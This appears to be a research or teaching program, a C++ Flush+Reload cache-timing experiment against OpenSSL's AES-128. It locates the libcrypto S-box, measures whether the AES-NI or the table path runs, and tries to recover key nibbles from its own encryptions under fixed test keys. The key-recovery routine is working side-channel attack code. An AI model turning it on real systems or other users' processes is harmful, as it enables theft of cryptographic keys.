#define OPENSSL_SUPPRESS_DEPRECATED 1
#include <openssl/evp.h>
#include <openssl/opensslv.h>

#include "cache_utils.hpp"

#include <algorithm>
#include <array>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <ctime>
#include <random>
#include <vector>

#include <dlfcn.h>
#include <unistd.h>

#ifdef __linux__
#include <sched.h>
#endif

namespace {

constexpr std::size_t CACHE_LINE       = 64;
constexpr std::size_t PAGE_SIZE        = 4096;
constexpr std::size_t ENTRIES_PER_LINE = CACHE_LINE / sizeof(std::uint32_t);  // 16
constexpr std::size_t LINES_PER_TABLE  = 256 / ENTRIES_PER_LINE;              // 16
constexpr std::size_t NUM_TABLES       = 4;
constexpr int        NUM_POSITIONS     = 16;
constexpr int        PROBE_LINES       = 64;

constexpr int FIRST_ROUND_POS[NUM_TABLES][4] = {
    { 0,  4,  8, 12},   // T0
    { 5,  9, 13,  1},   // T1
    {10, 14,  2,  6},   // T2
    {15,  3,  7, 11},   // T3
};

const std::uint8_t SBOX_SIG[16] = {
    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5,
    0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76
};

const volatile void* vaddr(const void* p) {
    return static_cast<const volatile void*>(p);
}

void pin_to_cpu(int cpu) {
#ifdef __linux__
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    sched_setaffinity(0, sizeof(set), &set);
#else
    (void)cpu;
#endif
}

bool aesni_in_cpu() {
#if defined(__x86_64__) || defined(__i386__)
    __builtin_cpu_init();
    return __builtin_cpu_supports("aes") != 0;
#else
    return false;
#endif
}

void ensure_mode(int argc, char** argv) {
    const bool want_sw = (argc > 1 && std::strcmp(argv[1], "sw") == 0);
    if (!want_sw) return;
    if (std::getenv("AES_MODE") != nullptr) return;   // уже перезапущены
    setenv("OPENSSL_ia32cap", "0", 1);
    setenv("AES_MODE", "sw", 1);
    execv("/proc/self/exe", argv);
    std::perror("[предупреждение] execv");
}

bool software_mode() {
    const char* m = std::getenv("AES_MODE");
    return m != nullptr && std::strcmp(m, "sw") == 0;
}

struct ConstantWindow {
    std::uint8_t* addr  = nullptr;
    std::size_t   size  = 0;
    std::uint8_t* sbox  = nullptr;
    int           copies = 0;

    std::size_t lines() const { return size / CACHE_LINE; }
};

ConstantWindow find_constant_window() {
    Dl_info info{};
    if (dladdr(reinterpret_cast<void*>(EVP_aes_128_ecb), &info) == 0 ||
        info.dli_fname == nullptr)
        return {};

    std::FILE* fp = std::fopen("/proc/self/maps", "r");
    if (fp == nullptr) return {};

    ConstantWindow best;
    char line[640];

    while (std::fgets(line, sizeof line, fp) != nullptr) {
        unsigned long start = 0, end = 0;
        char perms[8] = {0};
        char path[320] = {0};
        if (std::sscanf(line, "%lx-%lx %7s %*s %*s %*s %319s",
                        &start, &end, perms, path) < 4)
            continue;
        if (perms[0] != 'r') continue;
        if (std::strstr(path, "libcrypto") == nullptr) continue;

        const std::uint8_t* p = reinterpret_cast<const std::uint8_t*>(start);
        const std::uint8_t* e = reinterpret_cast<const std::uint8_t*>(end);
        const std::uint8_t* q = p;

        while (q + 16 <= e) {
            const std::uint8_t* f = static_cast<const std::uint8_t*>(
                memmem(q, static_cast<std::size_t>(e - q),
                       SBOX_SIG, sizeof SBOX_SIG));
            if (f == nullptr) break;

            int copies = 0;
            while (copies < 8 &&
                   f + (copies + 1) * 256 <= e &&
                   std::memcmp(f + copies * 256, SBOX_SIG, 16) == 0)
                ++copies;

            if (copies > best.copies) {
                best.addr   = const_cast<std::uint8_t*>(p);
                best.size   = static_cast<std::size_t>(e - p);
                best.sbox   = const_cast<std::uint8_t*>(f);
                best.copies = copies;
            }
            q = f + 16;
        }
    }
    std::fclose(fp);
    return best;
}

void flush_lines(const std::uint8_t* base, std::size_t lines) {
    for (std::size_t l = 0; l < lines; ++l)
        cache::clflush(base + l * CACHE_LINE);
    cache::mfence();
}

std::uint64_t calibrate_threshold(const void* probe) {
    const int N = 5000;
    std::vector<std::uint64_t> hit, miss;
    hit.reserve(N);
    miss.reserve(N);

    for (int i = 0; i < N; ++i) {
        (void)cache::measure_access_time(vaddr(probe));
        hit.push_back(cache::measure_access_time(vaddr(probe)));

        cache::clflush(probe);
        cache::mfence();
        miss.push_back(cache::measure_access_time(vaddr(probe)));
    }

    std::sort(hit.begin(), hit.end());
    std::sort(miss.begin(), miss.end());
    const std::uint64_t h    = hit[hit.size() / 2];
    const std::uint64_t m    = miss[miss.size() / 2];
    const std::uint64_t mlow = miss[miss.size() / 10];
    const std::uint64_t thr  = (h + mlow) / 2;

    std::printf("[калибровка] кэшированная линия: медиана = %4lu тактов\n",
                (unsigned long)h);
    std::printf("[калибровка] вытесненная линия: медиана = %4lu тактов, p10 = %4lu тактов\n",
                (unsigned long)m, (unsigned long)mlow);
    std::printf("[калибровка] ПОРОГ попадание/промах = %4lu тактов\n\n",
                (unsigned long)thr);
    return thr;
}

void make_order(std::size_t* order, std::size_t n, std::mt19937_64& rng) {
    for (std::size_t i = 0; i < n; ++i) order[i] = i;
    for (std::size_t i = n - 1; i > 0; --i) {
        const std::size_t j = rng() % (i + 1);
        std::swap(order[i], order[j]);
    }
}

EVP_CIPHER_CTX* make_ctx(const std::uint8_t key[16]) {
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    EVP_EncryptInit_ex(ctx, EVP_aes_128_ecb(), nullptr, key, nullptr);
    EVP_CIPHER_CTX_set_padding(ctx, 0);
    return ctx;
}

double evp_ns_per_block(EVP_CIPHER_CTX* ctx) {
    std::uint8_t in[16] = {0}, out[32];
    volatile std::uint8_t sink = 0;
    int outl = 0;

    for (int i = 0; i < 100000; ++i) {
        EVP_EncryptUpdate(ctx, out, &outl, in, 16);
        sink ^= out[i & 15];
    }

    const int N = 2000000;
    timespec a, b;
    clock_gettime(CLOCK_MONOTONIC, &a);
    for (int i = 0; i < N; ++i) {
        EVP_EncryptUpdate(ctx, out, &outl, in, 16);
        sink ^= out[i & 15];
    }
    clock_gettime(CLOCK_MONOTONIC, &b);

    const double sec = (double)(b.tv_sec - a.tv_sec)
                     + (double)(b.tv_nsec - a.tv_nsec) * 1e-9;
    (void)sink;
    return sec * 1e9 / (double)N;
}

struct Footprint {
    std::vector<std::uint64_t> hits;
    std::uint64_t total = 0;
    std::size_t   max_line = 0;
    double        max_pct  = 0.0;
};

Footprint footprint(const ConstantWindow& w, std::uint64_t thr,
                    std::size_t trials, const std::uint8_t key[16],
                    bool with_victim, std::uint64_t seed) {
    Footprint fp;
    fp.hits.assign(w.lines(), 0);

    EVP_CIPHER_CTX* ctx = with_victim ? make_ctx(key) : nullptr;

    std::mt19937_64 rng(seed);
    std::mt19937_64 pt_rng(seed ^ 0x9e3779b9ULL);
    std::vector<std::size_t> order(w.lines());

    std::uint8_t pt[16], ct[32];
    int outl = 0;

    for (std::size_t s = 0; s < trials; ++s) {
        for (int i = 0; i < NUM_POSITIONS; ++i) pt[i] = (std::uint8_t)pt_rng();

        flush_lines(w.addr, w.lines());

        if (with_victim) {
            EVP_EncryptUpdate(ctx, ct, &outl, pt, 16);
            cache::mfence();
        }

        make_order(order.data(), order.size(), rng);
        for (std::size_t n = 0; n < order.size(); ++n) {
            const std::size_t l = order[n];
            const std::uint64_t dt =
                cache::measure_access_time(vaddr(w.addr + l * CACHE_LINE));
            if (dt < thr) { fp.hits[l]++; ++fp.total; }
        }
    }

    for (std::size_t l = 0; l < fp.hits.size(); ++l) {
        const double pct = trials ? 100.0 * (double)fp.hits[l] / (double)trials : 0.0;
        if (pct > fp.max_pct) { fp.max_pct = pct; fp.max_line = l; }
    }

    if (ctx != nullptr) EVP_CIPHER_CTX_free(ctx);
    return fp;
}

std::size_t hot_lines(const Footprint& fp, std::size_t trials) {
    std::size_t hot = 0;
    for (std::uint64_t h : fp.hits)
        if (trials && 100.0 * (double)h / (double)trials > 50.0) ++hot;
    return hot;
}

void print_footprint(const char* label, const Footprint& fp, std::size_t trials) {
    const std::size_t hot = hot_lines(fp, trials);
    const double avg = trials ? (double)fp.total / (double)trials : 0.0;

    std::printf(" %-16s линий/шифр = %7.2f,  горячих(>50%%) = %4zu,  макс = %5.1f%% (линия %zu)\n",
                label, avg, hot, fp.max_pct, fp.max_line);

    if (hot > 0) {
        std::printf("                    горячие линии:");
        std::size_t shown = 0;
        for (std::size_t l = 0; l < fp.hits.size() && shown < 16; ++l) {
            const double pct = trials ? 100.0 * (double)fp.hits[l] / (double)trials : 0.0;
            if (pct > 50.0) {
                std::printf(" %zu:%.0f%%", l, pct);
                ++shown;
            }
        }
        if (hot > shown) std::printf(" ... (всего %zu)", hot);
        std::printf("\n");
    }
}

void run_attack(const ConstantWindow& w, std::uint64_t thr, std::size_t trials,
                const std::uint8_t true_key[16], std::uint64_t seed) {
    const std::uint8_t* probe = reinterpret_cast<const std::uint8_t*>(
        reinterpret_cast<std::uintptr_t>(w.addr) & ~(PAGE_SIZE - 1));
    const std::size_t lines = PROBE_LINES;

    EVP_CIPHER_CTX* ctx = make_ctx(true_key);

    std::array<std::array<std::uint64_t, 256>, NUM_POSITIONS> score{};
    std::mt19937_64 rng(seed);
    std::mt19937_64 pt_rng(seed ^ 0x1234567ULL);
    std::vector<std::size_t> order(lines);

    std::uint64_t total_hits = 0;

    for (std::size_t s = 0; s < trials; ++s) {
        std::uint8_t pt[16], ct[32];
        int outl = 0;
        for (int i = 0; i < NUM_POSITIONS; ++i) pt[i] = (std::uint8_t)pt_rng();

        flush_lines(probe, lines);
        EVP_EncryptUpdate(ctx, ct, &outl, pt, 16);
        cache::mfence();

        make_order(order.data(), lines, rng);
        bool hit[PROBE_LINES];
        for (std::size_t n = 0; n < order.size(); ++n) {
            const std::size_t l = order[n];
            const std::uint64_t dt =
                cache::measure_access_time(vaddr(probe + l * CACHE_LINE));
            hit[l] = (dt < thr);
            if (hit[l]) ++total_hits;
        }

        for (std::size_t tb = 0; tb < NUM_TABLES; ++tb) {
            for (int j = 0; j < 4; ++j) {
                const int pos = FIRST_ROUND_POS[tb][j];
                const int p   = pt[pos];
                for (int k = 0; k < 256; ++k) {
                    const std::size_t line =
                        tb * LINES_PER_TABLE + (std::size_t)(p ^ k) / ENTRIES_PER_LINE;
                    if (hit[line]) score[pos][k]++;
                }
            }
        }
    }

    EVP_CIPHER_CTX_free(ctx);

    std::printf("--------------------------------------------------------------\n");
    std::printf(" ЭКСПЕРИМЕНТ 3: попытка восстановления ключа (модель T-таблиц)\n");
    std::printf("--------------------------------------------------------------\n");

    std::printf(" байт   истина  лучший%%   второй%%   разрыв   статус\n");
    std::printf(" ----   ------  -------   -------   ------   ------\n");

    int correct = 0;

    for (int pos = 0; pos < NUM_POSITIONS; ++pos) {
        std::uint64_t best_score = 0;
        for (int k = 0; k < 256; ++k)
            if (score[pos][k] > best_score) best_score = score[pos][k];

        std::uint64_t second_score = 0;
        int leaders = 0;
        for (int k = 0; k < 256; ++k) {
            if (score[pos][k] == best_score) { ++leaders; continue; }
            if (score[pos][k] > second_score) second_score = score[pos][k];
        }

        const double pct  = trials ? 100.0 * (double)best_score  / trials : 0.0;
        const double pct2 = trials ? 100.0 * (double)second_score / trials : 0.0;
        const double gap  = pct - pct2;

        int best_k = 0;
        for (int k = 1; k < 256; ++k)
            if (score[pos][k] > score[pos][best_k]) best_k = k;

        const bool signal = (pct >= 50.0) && (gap >= 5.0) && (leaders == 1);
        const int true_nibble = true_key[pos] >> 4;

        if (signal && best_k / 16 == true_nibble) ++correct;

        const char* status = !signal
            ? (leaders > 1 ? "НЕТ СИГНАЛА (ничья)" : "НЕТ СИГНАЛА (шум)")
            : (best_k / 16 == true_nibble ? "ВЕРНО" : "НЕВЕРНО");

        std::printf(" [%2d]   0x%02X   %5.1f     %5.1f     %5.1f    %s\n",
                    pos, true_key[pos], pct, pct2, gap, status);
    }

    std::printf("\n Восстановлено старших полубайтов: %d/16  (= %d бит ключа)\n",
                correct, correct * 4);
    std::printf(" истинный ключ = ");
    for (int i = 0; i < NUM_POSITIONS; ++i) std::printf("%02x", true_key[i]);
    std::printf("\n");
}

}  // namespace

int main(int argc, char** argv) {
    ensure_mode(argc, argv);
    pin_to_cpu(0);

    std::size_t trials = 3000;
    for (int i = 1; i < argc; ++i) {
        const long v = std::strtol(argv[i], nullptr, 10);
        if (v > 0) { trials = (std::size_t)v; break; }
    }

    const bool sw = software_mode();

    const std::uint8_t keyA[16] = {
        0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6,
        0xab, 0xf7, 0x15, 0x88, 0x09, 0xcf, 0x4f, 0x3c
    };
    const std::uint8_t keyB[16] = {
        0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77,
        0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff
    };

    std::printf("==============================================================\n");
    std::printf(" Атака Flush+Reload против AES из OpenSSL\n");
    std::printf("==============================================================\n");
    std::printf(" OpenSSL : %s\n", OPENSSL_VERSION_TEXT);
    std::printf(" Режим   : %s\n",
                sw ? "ПРОГРАММНЫЙ (OPENSSL_ia32cap=0, для сравнения)"
                   : "АППАРАТНЫЙ (AES-NI, по умолчанию)");
    std::printf(" AES-NI  в CPU: %s\n\n",
                aesni_in_cpu() ? "есть" : "НЕТ");

    const ConstantWindow w = find_constant_window();
    if (w.addr == nullptr || w.sbox == nullptr) {
        std::printf(" Константный сегмент libcrypto не найден -- эксперимент прерван.\n");
        return 1;
    }
    std::printf(" .rodata libcrypto: %p .. +%zu байт = %zu линий\n",
                static_cast<void*>(w.addr), w.size, w.lines());
    std::printf(" S-box: адрес %p, копий = %d, смещение в сегменте = 0x%lx\n\n",
                static_cast<void*>(w.sbox), w.copies,
                (unsigned long)(w.sbox - w.addr));

    EVP_CIPHER_CTX* warm = make_ctx(keyA);
    std::uint8_t warm_ct[32];
    int warm_outl = 0;
    for (int i = 0; i < 1000; ++i) {
        std::uint8_t t[16] = {0};
        EVP_EncryptUpdate(warm, warm_ct, &warm_outl, t, 16);
    }

    std::printf("--------------------------------------------------------------\n");
    std::printf(" ЭКСПЕРИМЕНТ 1: какой путь реально выполняется\n");
    std::printf("--------------------------------------------------------------\n");
    const double ns = evp_ns_per_block(warm);
    const double mbps = 16.0 / (ns * 1e-9) / 1e6;
    std::printf(" EVP AES-128-ECB: %.1f нс/блок = %.0f МБ/с\n", ns, mbps);
    std::printf("   эталоны: AES-NI ~12 нс/блок (~1300 МБ/с),\n");
    std::printf("            программный путь ~78 нс/блок (~210 МБ/с)\n");
    std::printf(" => %s\n",
                ns < 40.0
                    ? "ВЫБРАН АППАРАТНЫЙ ПУТЬ (инструкции AES-NI)"
                    : "ВЫБРАН ПРОГРАММНЫЙ ПУТЬ (таблицы)");
    EVP_CIPHER_CTX_free(warm);

    const std::uint64_t thr = calibrate_threshold(w.sbox);

    std::printf("--------------------------------------------------------------\n");
    std::printf(" ЭКСПЕРИМЕНТ 2: след шифрования во всём .rodata libcrypto\n");
    std::printf("--------------------------------------------------------------\n");
    print_footprint("ключ A + шифр:", footprint(w, thr, trials, keyA, true, 0xA111), trials);
    print_footprint("ключ B + шифр:", footprint(w, thr, trials, keyB, true, 0xB222), trials);
    print_footprint("контроль:",       footprint(w, thr, trials, keyA, false, 0xC333), trials);
    std::printf("\n (след для ключа A и ключа B совпадает: карта обращений\n");
    std::printf("  вообще не зависит от ключа и открытого текста)\n\n");

    run_attack(w, thr, trials, keyA, 0xC0FFEEULL);

    return 0;
}
